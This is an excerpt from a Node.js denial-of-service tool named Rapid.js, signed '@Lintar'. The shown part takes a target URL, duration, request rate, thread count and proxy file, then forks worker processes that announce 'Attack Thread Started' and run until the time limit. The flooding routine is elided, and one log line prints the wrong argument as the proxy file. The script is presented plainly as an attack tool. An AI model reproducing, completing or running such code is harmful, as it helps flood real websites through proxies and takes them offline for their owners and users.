 ...
 if (process.argv.length < 7){console.log(`@Lintar\n node Rapid.js target time rate thread proxyFile\nExample: node Rapid https://target.com 60 8 2 proxy.txt`); process.exit();}
 const headers = {};
...
if (cluster.isMaster){
  ...
  console.log(`
           ...
           ╚══╦═════════════════════════════════════════╦══╝
              ╚═════════════════════════════════════════╝
`)
  console.log(`[@Lintar] Time: ${getCurrentTime()}`)
  console.log(`------------------------------------------`)
  console.log(`[@Lintar] Target: `+ process.argv[2])
  console.log(`[@Lintar] Time: `+ process.argv[3])
  console.log(`[@Lintar] Rate: `+ process.argv[4])
  console.log(`[@Lintar] Thread: ` + process.argv[5])
  console.log(`[@Lintar] Proxy: ` + process.argv[5])
  console.log(`------------------------------------------`)
  for (let i = 1; i <= process.argv[5]; i++){
    cluster.fork();
    console.log(`[@Lintar] ${getCurrentTime()} Attack Thread ${i} Started`);
  }
  console.log(`[@Lintar] ${getCurrentTime()} The Attack Has Started`);
  setInterval(getStatus, 2000);
  setTimeout(() => {
    console.log(`[@Lintar] ${getCurrentTime()} The Attack Is Over`);
    process.exit(1);
  }, process.argv[3] * 1000);
} 
